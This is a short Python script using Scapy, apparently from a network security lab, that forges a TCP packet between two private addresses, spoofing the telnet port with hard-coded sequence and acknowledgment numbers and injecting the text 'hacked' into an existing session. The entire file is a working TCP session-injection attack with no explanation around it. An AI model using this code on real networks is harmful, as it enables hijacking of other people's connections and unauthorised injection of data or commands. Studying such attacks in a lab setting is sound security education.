from socket import IP_ADD_MEMBERSHIP
from scapy.all import*

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

ip  = IP(src=IP_A,dst=IP_B)
tcp = TCP(sport=23, dport=47790, flags="A", seq=3115277395, ack=665231552)
data="\r hacked \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
